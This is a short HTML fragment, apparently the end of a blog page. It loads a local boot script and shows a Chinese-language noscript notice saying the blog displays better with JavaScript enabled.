<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
